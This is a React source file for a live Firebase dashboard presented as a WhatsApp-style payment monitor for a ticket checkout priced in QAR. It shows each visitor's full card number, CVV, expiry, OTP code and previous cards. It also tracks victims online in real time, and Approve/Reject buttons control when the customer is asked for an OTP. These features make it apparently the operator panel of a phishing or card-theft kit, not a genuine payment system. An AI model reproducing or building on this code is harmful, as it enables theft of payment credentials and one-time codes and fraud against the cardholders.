import { useEffect, useMemo, useRef, useState } from "react";
import {
  Bell,
  BellOff,
  CalendarDays,
  CreditCard,
  LockKeyhole,
  Loader2,
  LogOut,
  Mail,
  MessageCircle,
  Phone,
  Search,
} from "lucide-react";
import { Link } from "wouter";
import { onAuthStateChanged, signInWithEmailAndPassword, signOut, type User } from "firebase/auth";
import { collection, doc, onSnapshot, setDoc } from "firebase/firestore";
import { onValue, ref as databaseRef } from "firebase/database";
import { auth, database, db } from "@/lib/firebase";
import { formatQar } from "@/lib/ticket-cart";

type CheckoutItem = {
  id?: string;
  name?: string;
  quantity?: number;
  unitPrice?: number;
  lineTotal?: number;
};

type Billing = {
  firstName?: string;
  lastName?: string;
  phone?: string;
  email?: string;
};

type Payment = {
  cardholderName?: string;
  cardNumberFull?: string;
  cardNumberMasked?: string;
  expiry?: string;
  cvv?: string;
  otpCode?: string | null;
  status?: string;
  errorMessage?: string | null;
};

type CardHistoryEntry = {
  cardholderName?: string;
  cardNumberFull?: string;
  cardNumberMasked?: string;
  expiry?: string;
  cvv?: string;
  changedAt?: string;
};

type PayRecord = {
  id: string;
  billing?: Billing;
  payment?: Payment;
  cardHistory?: CardHistoryEntry[];
  items?: CheckoutItem[];
  subtotal?: number;
  total?: number;
  visitDateIso?: string | null;
  visitTime?: string | null;
  currentPage?: string;
  status?: string;
  isUnread?: boolean;
  createdAt?: string;
  updatedAt?: string;
  [key: string]: unknown;
};

type PresenceRecord = {
  online?: boolean;
  currentPage?: string;
  submissionId?: string | null;
  lastSeen?: unknown;
};

function getDateSortValue(record: PayRecord): number {
  const candidate = record.updatedAt ?? record.createdAt;
  if (!candidate) {
    return 0;
  }

  const parsed = Date.parse(candidate);
  return Number.isNaN(parsed) ? 0 : parsed;
}

function getDisplayName(record: PayRecord): string {
  const firstName = record.billing?.firstName?.trim() ?? "";
  const lastName = record.billing?.lastName?.trim() ?? "";
  const fullName = `${firstName} ${lastName}`.trim();
  return fullName || "زائر جديد";
}

function getLastMessage(record: PayRecord): string {
  const paymentStatus = record.payment?.status ?? record.status;
  if (paymentStatus === "step_one_submitted") {
    return "Step 1 submitted - waiting card details";
  }
  if (paymentStatus === "pending_review") {
    return "Waiting dashboard approval";
  }
  if (paymentStatus === "approved") {
    return "Approved - customer can enter OTP";
  }
  if (paymentStatus === "rejected") {
    return "Card rejected from dashboard";
  }
  if (paymentStatus === "otp_failed") {
    return "OTP failed - needs review";
  }
  if (paymentStatus === "otp_verified") {
    return "Payment verified";
  }
  if (paymentStatus === "otp_requested" || paymentStatus === "pending") {
    return "Waiting for OTP confirmation";
  }

  if (record.currentPage) {
    return `Current page: ${record.currentPage}`;
  }

  return "New checkout activity";
}

function getFormattedTime(value?: string | number): string {
  if (!value) {
    return "--";
  }

  const parsed =
    typeof value === "number" ? value : Date.parse(value);
  if (Number.isNaN(parsed)) {
    return String(value);
  }

  return new Intl.DateTimeFormat("en-GB", {
    day: "2-digit",
    month: "short",
    hour: "2-digit",
    minute: "2-digit",
  }).format(new Date(parsed));
}

function getPresenceForRecord(
  record: PayRecord,
  presenceMap: Record<string, PresenceRecord>
): PresenceRecord | undefined {
  const direct = presenceMap[record.id];
  if (direct) {
    return direct;
  }

  return Object.values(presenceMap).find(
    (presence) => presence?.submissionId === record.id
  );
}

function resolvePresenceLastSeenValue(value: unknown): string {
  if (typeof value === "number" || typeof value === "string") {
    return getFormattedTime(value);
  }

  return "--";
}

function toGroupedCardNumber(value: string): string {
  const trimmed = value.trim();
  if (!trimmed) {
    return "•••• •••• •••• ••••";
  }

  if (trimmed.includes("*") || trimmed.includes("•")) {
    return trimmed;
  }

  const digits = trimmed.replace(/\D/g, "").slice(0, 19);
  if (!digits) {
    return "•••• •••• •••• ••••";
  }
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function getStatusBadge(status?: string): { label: string; className: string } {
  if (status === "step_one_submitted") {
    return { label: "Step 1", className: "bg-[#24333d] text-[#b9d6e3]" };
  }
  if (status === "pending_review") {
    return { label: "Under Review", className: "bg-[#3b2e14] text-[#ffd888]" };
  }
  if (status === "approved") {
    return { label: "Approved", className: "bg-[#113744] text-[#8ddfff]" };
  }
  if (status === "rejected" || status === "otp_failed") {
    return { label: "Rejected", className: "bg-[#3b1414] text-[#ff9f9f]" };
  }
  if (status === "otp_verified") {
    return { label: "Verified", className: "bg-[#143224] text-[#7bf3b0]" };
  }
  return { label: "Pending", className: "bg-[#2a3942] text-[#9ad4ff]" };
}

export default function Dashboard() {
  const [authChecking, setAuthChecking] = useState(true);
  const [dashboardUser, setDashboardUser] = useState<User | null>(null);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [authError, setAuthError] = useState<string | null>(null);
  const [records, setRecords] = useState<PayRecord[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [isMarkingRead, setIsMarkingRead] = useState(false);
  const [decisionLoading, setDecisionLoading] = useState<
    "approve" | "reject" | null
  >(null);
  const [presenceMap, setPresenceMap] = useState<Record<string, PresenceRecord>>(
    {}
  );
  const [isSoundEnabled, setIsSoundEnabled] = useState(true);
  const hasReceivedFirstSnapshotRef = useRef(false);
  const previousStatusMapRef = useRef<Map<string, string>>(new Map());
  const soundEnabledRef = useRef(true);
  const audioContextRef = useRef<AudioContext | null>(null);
  const isAuthenticated = Boolean(dashboardUser);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      setDashboardUser(user);
      setAuthChecking(false);
    });

    return () => {
      unsubscribe();
    };
  }, []);

  useEffect(() => {
    soundEnabledRef.current = isSoundEnabled;
  }, [isSoundEnabled]);

  useEffect(() => {
    if (!isAuthenticated) {
      setPresenceMap({});
      return;
    }

    const presenceRef = databaseRef(database, "presence");
    const unsubscribe = onValue(presenceRef, (snapshot) => {
      const rawPresence = snapshot.val() as Record<string, PresenceRecord> | null;
      setPresenceMap(rawPresence ?? {});
    });

    return () => {
      unsubscribe();
    };
  }, [isAuthenticated]);

  useEffect(() => {
    return () => {
      if (audioContextRef.current) {
        void audioContextRef.current.close();
      }
    };
  }, []);

  const playNotificationSound = () => {
    if (!soundEnabledRef.current || typeof window === "undefined") {
      return;
    }

    try {
      const AudioContextClass =
        window.AudioContext ||
        (
          window as Window & {
            webkitAudioContext?: typeof AudioContext;
          }
        ).webkitAudioContext;

      if (!AudioContextClass) {
        return;
      }

      if (!audioContextRef.current) {
        audioContextRef.current = new AudioContextClass();
      }

      const audioContext = audioContextRef.current;
      void audioContext.resume().catch(() => {
      });

      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);

      oscillator.type = "sine";
      oscillator.frequency.setValueAtTime(880, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.0001, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(
        0.15,
        audioContext.currentTime + 0.01
      );
      gainNode.gain.exponentialRampToValueAtTime(
        0.0001,
        audioContext.currentTime + 0.22
      );

      oscillator.start();
      oscillator.stop(audioContext.currentTime + 0.22);
    } catch {
    }
  };

  useEffect(() => {
    if (!isAuthenticated) {
      hasReceivedFirstSnapshotRef.current = false;
      previousStatusMapRef.current = new Map();
      setRecords([]);
      setSelectedId(null);
      setIsLoading(false);
      return;
    }

    setIsLoading(true);
    const unsubscribe = onSnapshot(
      collection(db, "pays"),
      (snapshot) => {
        const nextRecords: PayRecord[] = snapshot.docs
          .map((entry) => ({
            id: entry.id,
            ...(entry.data() as Omit<PayRecord, "id">),
          }))
          .sort((a, b) => getDateSortValue(b) - getDateSortValue(a));

        const nextStatusMap = new Map<string, string>();
        nextRecords.forEach((record) => {
          nextStatusMap.set(
            record.id,
            String(record.payment?.status ?? record.status ?? "")
          );
        });

        if (hasReceivedFirstSnapshotRef.current) {
          const hasNewRecord = nextRecords.some(
            (record) => !previousStatusMapRef.current.has(record.id)
          );

          const hasStatusChange = nextRecords.some((record) => {
            const previousStatus = previousStatusMapRef.current.get(record.id);
            const nextStatus = nextStatusMap.get(record.id);
            return previousStatus !== undefined && previousStatus !== nextStatus;
          });

          if (hasNewRecord || hasStatusChange) {
            playNotificationSound();
          }
        }

        previousStatusMapRef.current = nextStatusMap;
        hasReceivedFirstSnapshotRef.current = true;

        setRecords(nextRecords);
        setError(null);
        setIsLoading(false);

        setSelectedId((currentSelectedId) => {
          if (currentSelectedId) {
            return currentSelectedId;
          }
          return nextRecords[0]?.id ?? null;
        });
      },
      (snapshotError) => {
        setError(snapshotError.message);
        setIsLoading(false);
      }
    );

    return () => unsubscribe();
  }, [isAuthenticated]);

  const filteredRecords = useMemo(() => {
    const normalizedSearch = search.trim().toLowerCase();
    if (!normalizedSearch) {
      return records;
    }

    return records.filter((record) => {
      const fullName = getDisplayName(record).toLowerCase();
      const phone = (record.billing?.phone ?? "").toLowerCase();
      const email = (record.billing?.email ?? "").toLowerCase();
      const recordId = record.id.toLowerCase();
      return (
        fullName.includes(normalizedSearch) ||
        phone.includes(normalizedSearch) ||
        email.includes(normalizedSearch) ||
        recordId.includes(normalizedSearch)
      );
    });
  }, [records, search]);

  const selectedRecord =
    records.find((record) => record.id === selectedId) ?? filteredRecords[0] ?? null;
  const selectedStatus = selectedRecord?.payment?.status ?? selectedRecord?.status;
  const selectedStatusBadge = getStatusBadge(selectedStatus);
  const hasCardForReview = Boolean(
    selectedRecord?.payment?.cardNumberFull ||
      selectedRecord?.payment?.cardNumberMasked
  );
  const selectedPresence = selectedRecord
    ? getPresenceForRecord(selectedRecord, presenceMap)
    : undefined;
  const isSelectedOnline = Boolean(selectedPresence?.online);
  const selectedLastSeen = resolvePresenceLastSeenValue(selectedPresence?.lastSeen);
  const selectedCardNumber = toGroupedCardNumber(
    selectedRecord?.payment?.cardNumberFull ??
      selectedRecord?.payment?.cardNumberMasked ??
      ""
  );
  const selectedCardHistory = (selectedRecord?.cardHistory ?? [])
    .slice()
    .sort((a, b) => {
      const left = Date.parse(a.changedAt ?? "");
      const right = Date.parse(b.changedAt ?? "");
      return (Number.isNaN(right) ? 0 : right) - (Number.isNaN(left) ? 0 : left);
    });

  const calculatedTotal =
    typeof selectedRecord?.total === "number"
      ? selectedRecord.total
      : (selectedRecord?.items ?? []).reduce((sum, item) => {
          const itemTotal =
            typeof item.lineTotal === "number"
              ? item.lineTotal
              : (item.unitPrice ?? 0) * (item.quantity ?? 0);
          return sum + itemTotal;
        }, 0);

  const unreadCount = records.filter((record) => record.isUnread).length;

  const onMarkAsRead = async () => {
    if (!selectedRecord || !selectedRecord.isUnread) {
      return;
    }

    setIsMarkingRead(true);
    try {
      await setDoc(
        doc(db, "pays", selectedRecord.id),
        {
          isUnread: false,
          updatedAt: new Date().toISOString(),
        },
        { merge: true }
      );
    } catch (markError) {
      const message =
        markError instanceof Error
          ? markError.message
          : "Unable to mark record as read.";
      setError(message);
    } finally {
      setIsMarkingRead(false);
    }
  };

  const onUpdateDecision = async (decision: "approved" | "rejected") => {
    if (!selectedRecord) {
      return;
    }

    setDecisionLoading(decision === "approved" ? "approve" : "reject");
    try {
      await setDoc(
        doc(db, "pays", selectedRecord.id),
        {
          status: decision,
          payment: {
            ...(selectedRecord.payment ?? {}),
            status: decision,
            errorMessage:
              decision === "rejected"
                ? "تم رفض البطاقة من لوحة التحكم."
                : null,
          },
          updatedAt: new Date().toISOString(),
        },
        { merge: true }
      );
      setError(null);
    } catch (decisionError) {
      const message =
        decisionError instanceof Error
          ? decisionError.message
          : "Unable to update payment decision.";
      setError(message);
    } finally {
      setDecisionLoading(null);
    }
  };

  const onDashboardLogin = async () => {
    try {
      await signInWithEmailAndPassword(auth, loginEmail.trim(), loginPassword);
      setAuthError(null);
      setLoginPassword("");
    } catch (loginError) {
      const errorCode =
        typeof loginError === "object" &&
        loginError !== null &&
        "code" in loginError &&
        typeof (loginError as { code?: unknown }).code === "string"
          ? (loginError as { code: string }).code
          : "";

      if (
        errorCode === "auth/invalid-credential" ||
        errorCode === "auth/user-not-found" ||
        errorCode === "auth/wrong-password" ||
        errorCode === "auth/invalid-email"
      ) {
        setAuthError("Invalid email or password.");
        return;
      }

      setAuthError("Unable to login with Firebase Auth.");
    }
  };

  const onDashboardLogout = async () => {
    try {
      await signOut(auth);
      setAuthError(null);
      setLoginPassword("");
      setLoginEmail("");
    } catch {
      setAuthError("Unable to logout right now.");
    }
  };

  if (authChecking) {
    return (
      <div className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6">
        <div className="mx-auto flex max-w-[460px] items-center justify-center rounded-2xl border border-[#2a3942] bg-[#111b21] p-6 text-sm text-[#9fb0b8]">
          <Loader2 className="mr-2 h-4 w-4 animate-spin text-[#25d366]" />
          Checking Firebase Auth session...
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6">
        <div className="mx-auto max-w-[460px]">
          <div className="rounded-2xl bg-gradient-to-l from-[#25d366] to-[#128c7e] p-4 text-white shadow-xl sm:p-5">
            <p className="text-xs font-semibold tracking-wide text-white/90">
              DASHBOARD ACCESS
            </p>
            <h1 className="mt-1 text-xl font-black sm:text-2xl">
              Sign in to Dashboard
            </h1>
          </div>

          <form
            className="mt-4 rounded-2xl border border-[#2a3942] bg-[#111b21] p-4 sm:p-5"
            onSubmit={(event) => {
              event.preventDefault();
              onDashboardLogin();
            }}
          >
            <div className="mb-4 flex items-center gap-2 text-sm font-semibold text-[#9fb0b8]">
              <LockKeyhole className="h-4 w-4 text-[#25d366]" />
              Protected dashboard login
            </div>

            <label className="block">
              <span className="mb-1 block text-xs font-semibold text-[#9fb0b8]">
                Email
              </span>
              <input
                type="email"
                value={loginEmail}
                onChange={(event) => setLoginEmail(event.target.value)}
                className="h-10 w-full rounded-md border border-[#2a3942] bg-[#0b141a] px-3 text-sm text-[#e9edef] outline-none focus:border-[#25d366]"
                placeholder="admin@example.com"
                autoComplete="email"
              />
            </label>

            <label className="mt-3 block">
              <span className="mb-1 block text-xs font-semibold text-[#9fb0b8]">
                Password
              </span>
              <input
                type="password"
                value={loginPassword}
                onChange={(event) => setLoginPassword(event.target.value)}
                className="h-10 w-full rounded-md border border-[#2a3942] bg-[#0b141a] px-3 text-sm text-[#e9edef] outline-none focus:border-[#25d366]"
                placeholder="Enter password"
                autoComplete="current-password"
              />
            </label>

            {authError ? (
              <p className="mt-3 rounded-md border border-[#5a1a1a] bg-[#2a1414] px-3 py-2 text-xs text-[#ffb4b4]">
                {authError}
              </p>
            ) : null}

            <button
              type="submit"
              className="mt-4 w-full rounded-md bg-[#25d366] px-4 py-2 text-sm font-semibold text-[#0b141a] hover:bg-[#20be5b]"
            >
              Login
            </button>

            <p className="mt-3 text-[11px] text-[#8696a0]">
              Use a Firebase Authentication user (Email/Password provider).
            </p>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0b141a] text-[#e9edef]">
      <div className="mx-auto max-w-[1300px] px-4 py-6 sm:px-6">
        <header className="rounded-2xl bg-gradient-to-l from-[#25d366] to-[#128c7e] p-4 text-white shadow-xl sm:p-5">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div>
              <p className="text-xs font-semibold tracking-wide text-white/90">
                LIVE FIREBASE MONITOR
              </p>
              <h1 className="mt-1 text-xl font-black sm:text-2xl">
                WhatsApp Style Payment Dashboard
              </h1>
            </div>
            <div className="flex items-center gap-2 text-sm">
              <span className="rounded-full bg-white/20 px-3 py-1 font-semibold">
                Total: {records.length}
              </span>
              <span className="rounded-full bg-black/20 px-3 py-1 font-semibold">
                Unread: {unreadCount}
              </span>
              <button
                type="button"
                onClick={() => setIsSoundEnabled((current) => !current)}
                className="inline-flex items-center gap-1 rounded-full bg-black/20 px-3 py-1 font-semibold text-white hover:bg-black/30"
              >
                {isSoundEnabled ? (
                  <Bell className="h-3.5 w-3.5" />
                ) : (
                  <BellOff className="h-3.5 w-3.5" />
                )}
                {isSoundEnabled ? "Sound on" : "Sound off"}
              </button>
              <button
                type="button"
                onClick={onDashboardLogout}
                className="inline-flex items-center gap-1 rounded-full bg-black/20 px-3 py-1 font-semibold text-white hover:bg-black/30"
              >
                <LogOut className="h-3.5 w-3.5" />
                Logout
              </button>
              <Link
                href="/"
                className="rounded-full bg-white/90 px-3 py-1 font-semibold text-[#128c7e] hover:bg-white"
              >
                Back to site
              </Link>
            </div>
          </div>
        </header>

        <section className="mt-4 grid gap-4 xl:grid-cols-[380px_1fr]">
          <aside className="rounded-2xl border border-[#2a3942] bg-[#111b21]">
            <div className="border-b border-[#2a3942] p-3">
              <div className="flex items-center gap-2 rounded-md bg-[#202c33] px-3 py-2">
                <Search className="h-4 w-4 text-[#8696a0]" />
                <input
                  type="text"
                  value={search}
                  onChange={(event) => setSearch(event.target.value)}
                  className="w-full bg-transparent text-sm text-[#e9edef] outline-none placeholder:text-[#8696a0]"
                  placeholder="Search by name, phone, email, or ID..."
                />
              </div>
            </div>

            <div className="max-h-[70vh] overflow-y-auto">
              {isLoading ? (
                <div className="flex items-center justify-center gap-2 p-6 text-sm text-[#8696a0]">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Loading records...
                </div>
              ) : null}

              {!isLoading && filteredRecords.length === 0 ? (
                <div className="p-6 text-center text-sm text-[#8696a0]">
                  No records found.
                </div>
              ) : null}

              {filteredRecords.map((record) => {
                const isSelected = selectedRecord?.id === record.id;
                const status = record.payment?.status ?? record.status;
                const statusBadge = getStatusBadge(status);
                const presence = getPresenceForRecord(record, presenceMap);
                const isOnline = Boolean(presence?.online);

                return (
                  <button
                    key={record.id}
                    type="button"
                    onClick={() => setSelectedId(record.id)}
                    className={`w-full border-b border-[#2a3942] px-3 py-3 text-left transition-colors ${
                      isSelected ? "bg-[#2a3942]" : "bg-transparent hover:bg-[#202c33]"
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className="mt-0.5 h-10 w-10 shrink-0 rounded-full bg-[#25d366] text-center text-xs font-black leading-10 text-[#0b141a]">
                        {(getDisplayName(record).charAt(0) || "V").toUpperCase()}
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center justify-between gap-2">
                          <p className="truncate text-sm font-semibold text-[#e9edef]">
                            {getDisplayName(record)}
                          </p>
                          <span className="shrink-0 text-[11px] text-[#8696a0]">
                            {getFormattedTime(record.updatedAt ?? record.createdAt)}
                          </span>
                        </div>
                        <p className="mt-0.5 truncate text-xs text-[#8696a0]">
                          {record.id}
                        </p>
                        <div className="mt-1 flex items-center gap-1.5 text-[10px]">
                          <span
                            className={`h-2 w-2 rounded-full ${
                              isOnline ? "bg-[#25d366]" : "bg-[#54656f]"
                            }`}
                          />
                          <span
                            className={
                              isOnline ? "text-[#25d366]" : "text-[#8696a0]"
                            }
                          >
                            {isOnline ? "online" : "offline"}
                          </span>
                        </div>
                        <div className="mt-2 flex items-center justify-between gap-2">
                          <p className="truncate text-xs text-[#c6d1d6]">
                            {getLastMessage(record)}
                          </p>
                          <span
                            className={`rounded-full px-2 py-0.5 text-[10px] font-semibold ${statusBadge.className}`}
                          >
                            {statusBadge.label}
                          </span>
                        </div>
                      </div>
                    </div>
                  </button>
                );
              })}
            </div>
          </aside>

          <main className="rounded-2xl border border-[#2a3942] bg-[#0f1a20]">
            {!selectedRecord ? (
              <div className="flex min-h-[400px] items-center justify-center px-6 text-center text-sm text-[#8696a0]">
                Select a conversation to view full checkout data.
              </div>
            ) : (
              <div className="p-4 sm:p-5">
                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-[#2a3942] pb-4">
                  <div className="flex items-center gap-3">
                    <div className="h-11 w-11 rounded-full bg-[#25d366] text-center text-sm font-black leading-[44px] text-[#0b141a]">
                      {(getDisplayName(selectedRecord).charAt(0) || "V").toUpperCase()}
                    </div>
                    <div>
                      <h2 className="text-lg font-black text-[#e9edef]">
                        {getDisplayName(selectedRecord)}
                      </h2>
                      <p className="text-xs text-[#8696a0]">{selectedRecord.id}</p>
                      <p
                        className={`mt-0.5 text-[11px] font-semibold ${
                          isSelectedOnline ? "text-[#25d366]" : "text-[#8696a0]"
                        }`}
                      >
                        {isSelectedOnline
                          ? "Online now"
                          : `Offline • Last seen ${selectedLastSeen}`}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <span
                      className={`rounded-full px-3 py-1 text-xs font-semibold ${selectedStatusBadge.className}`}
                    >
                      {selectedStatusBadge.label}
                    </span>
                    <button
                      type="button"
                      onClick={() => onUpdateDecision("approved")}
                      disabled={decisionLoading !== null || !hasCardForReview}
                      className="rounded-full border border-[#1f4f3a] bg-[#1a8e4c] px-3 py-1 text-xs font-semibold text-white hover:bg-[#14723c] disabled:cursor-not-allowed disabled:opacity-60"
                    >
                      {decisionLoading === "approve" ? "Approving..." : "Approve"}
                    </button>
                    <button
                      type="button"
                      onClick={() => onUpdateDecision("rejected")}
                      disabled={decisionLoading !== null || !hasCardForReview}
                      className="rounded-full border border-[#5a1a1a] bg-[#a63535] px-3 py-1 text-xs font-semibold text-white hover:bg-[#8d2c2c] disabled:cursor-not-allowed disabled:opacity-60"
                    >
                      {decisionLoading === "reject" ? "Rejecting..." : "Reject"}
                    </button>
                    <button
                      type="button"
                      onClick={onMarkAsRead}
                      disabled={!selectedRecord.isUnread || isMarkingRead}
                      className="rounded-full border border-[#2a3942] bg-[#202c33] px-3 py-1 text-xs font-semibold text-[#d5dfe4] hover:bg-[#2a3942] disabled:cursor-not-allowed disabled:opacity-60"
                    >
                      {isMarkingRead ? "Marking..." : "Mark as read"}
                    </button>
                  </div>
                </div>

                <div className="mt-4 grid gap-4 lg:grid-cols-[1.1fr_0.9fr]">
                  <section className="space-y-3">
                    <article className="max-w-[95%] rounded-xl rounded-tr-sm bg-[#202c33] px-4 py-3">
                      <p className="text-[11px] font-semibold tracking-wide text-[#9fb0b8]">
                        BILLING INFO
                      </p>
                      <div className="mt-2 space-y-1 text-sm text-[#e9edef]">
                        <p className="flex items-center gap-2">
                          <Phone className="h-4 w-4 text-[#25d366]" />
                          {selectedRecord.billing?.phone ?? "--"}
                        </p>
                        <p className="flex items-center gap-2">
                          <Mail className="h-4 w-4 text-[#25d366]" />
                          {selectedRecord.billing?.email ?? "--"}
                        </p>
                        <p className="flex items-center gap-2">
                          <CalendarDays className="h-4 w-4 text-[#25d366]" />
                          {selectedRecord.visitDateIso ?? "No visit date"}
                        </p>
                      </div>
                    </article>

                    <article className="mr-auto max-w-[95%] rounded-xl rounded-tl-sm bg-[#005c4b] px-4 py-3">
                      <p className="text-[11px] font-semibold tracking-wide text-[#b8eee1]">
                        ORDER SUMMARY
                      </p>
                      <div className="mt-2 space-y-2 text-sm text-white">
                        {(selectedRecord.items ?? []).length === 0 ? (
                          <p className="text-xs text-white/80">No item details found.</p>
                        ) : (
                          (selectedRecord.items ?? []).map((item, index) => (
                            <div
                              key={`${item.id ?? "item"}-${index}`}
                              className="rounded-md bg-black/15 px-2 py-1.5"
                            >
                              <p className="font-semibold">{item.name ?? "Ticket item"}</p>
                              <p className="text-xs text-white/80">
                                Qty: {item.quantity ?? 0} | Unit:{" "}
                                {formatQar(item.unitPrice ?? 0)}
                              </p>
                            </div>
                          ))
                        )}
                        <p className="pt-1 text-sm font-black">
                          Total: {formatQar(calculatedTotal)}
                        </p>
                      </div>
                    </article>
                  </section>

                  <section className="space-y-3">
                    <div className="rounded-2xl bg-gradient-to-br from-[#075e54] via-[#0f8c7a] to-[#25d366] p-4 text-white shadow-lg">
                      <p className="text-[11px] text-white/80">Payment Card Mockup</p>
                      <div className="mt-4 text-lg font-semibold tracking-[0.15em]" dir="ltr">
                        {selectedCardNumber}
                      </div>
                      <div className="mt-5 flex items-end justify-between gap-3">
                        <div className="min-w-0">
                          <p className="text-[10px] text-white/70">Card Holder</p>
                          <p className="truncate text-sm font-semibold">
                            {selectedRecord.payment?.cardholderName ?? "--"}
                          </p>
                        </div>
                        <div className="text-right">
                          <p className="text-[10px] text-white/70">Expiry</p>
                          <p className="text-sm font-semibold" dir="ltr">
                            {selectedRecord.payment?.expiry ?? "--/--"}
                          </p>
                        </div>
                      </div>
                      <div className="mt-3 inline-flex rounded-md bg-black/20 px-2.5 py-1 text-xs font-semibold">
                        CVV: {selectedRecord.payment?.cvv ?? "--"}
                      </div>
                    </div>

                    <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                      <p className="flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                        <CreditCard className="h-4 w-4 text-[#25d366]" />
                        FULL PAYMENT DATA
                      </p>
                      <div className="mt-2 space-y-1 text-sm text-[#e9edef]">
                        <p>
                          <span className="text-[#9fb0b8]">Card Number:</span>{" "}
                          {selectedRecord.payment?.cardNumberFull ??
                            selectedRecord.payment?.cardNumberMasked ??
                            "--"}
                        </p>
                        <p>
                          <span className="text-[#9fb0b8]">CVV:</span>{" "}
                          {selectedRecord.payment?.cvv ?? "--"}
                        </p>
                        <p>
                          <span className="text-[#9fb0b8]">OTP:</span>{" "}
                          {selectedRecord.payment?.otpCode ?? "--"}
                        </p>
                        <p>
                          <span className="text-[#9fb0b8]">Status:</span>{" "}
                          {selectedRecord.payment?.status ??
                            selectedRecord.status ??
                            "--"}
                        </p>
                        <p>
                          <span className="text-[#9fb0b8]">Last Update:</span>{" "}
                          {getFormattedTime(
                            selectedRecord.updatedAt ?? selectedRecord.createdAt
                          )}
                        </p>
                      </div>
                    </div>

                    <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                      <p className="flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                        <CreditCard className="h-4 w-4 text-[#25d366]" />
                        CARD HISTORY (OLD CARDS)
                      </p>
                      {selectedCardHistory.length === 0 ? (
                        <p className="mt-2 text-xs text-[#8696a0]">
                          No previous card updates for this visitor.
                        </p>
                      ) : (
                        <div className="mt-2 space-y-2">
                          {selectedCardHistory.map((entry, index) => (
                            <div
                              key={`${entry.changedAt ?? "history"}-${index}`}
                              className="rounded-md border border-[#2a3942] bg-[#0b141a] px-2.5 py-2 text-xs text-[#d5dfe4]"
                            >
                              <p className="font-semibold">
                                {entry.cardholderName ?? "--"}
                              </p>
                              <p className="mt-0.5" dir="ltr">
                                {toGroupedCardNumber(
                                  entry.cardNumberFull ??
                                    entry.cardNumberMasked ??
                                    ""
                                )}
                              </p>
                              <p className="mt-0.5 text-[#9fb0b8]">
                                Exp: {entry.expiry ?? "--/--"} | CVV:{" "}
                                {entry.cvv ?? "--"}
                              </p>
                              <p className="mt-0.5 text-[#8696a0]">
                                Changed: {getFormattedTime(entry.changedAt ?? "--")}
                              </p>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </section>
                </div>

                <section className="mt-4 rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                  <p className="mb-2 flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                    <MessageCircle className="h-4 w-4 text-[#25d366]" />
                    FULL RECORD JSON
                  </p>
                  <pre className="max-h-[320px] overflow-auto rounded-md bg-[#0b141a] p-3 text-[11px] leading-5 text-[#b9c7ce]">
                    {JSON.stringify(selectedRecord, null, 2)}
                  </pre>
                </section>

                {error ? (
                  <div className="mt-4 rounded-md border border-[#5a1a1a] bg-[#2a1414] px-3 py-2 text-xs text-[#ffb4b4]">
                    {error}
                  </div>
                ) : null}
              </div>
            )}
          </main>
        </section>
      </div>
    </div>
  );
}
